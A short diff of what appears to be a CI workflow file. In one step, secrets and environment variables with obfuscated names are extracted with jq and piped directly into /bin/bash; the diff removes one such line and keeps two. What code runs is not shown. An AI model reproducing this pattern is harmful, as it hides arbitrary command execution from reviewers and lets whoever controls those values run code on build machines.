@@ -27,7 +27,6 @@ jobs:
           j88: ${{ secrets.j88 }}
         run: |
           printf '%s' "$j88" | jq -r .lm64992 | /bin/bash
-          printf '%s' "$kanvr18" | jq -r .ajfi8 | /bin/bash
           echo $ulb2 | jq -r .jw33 | /bin/bash
 
       - name: Persist output
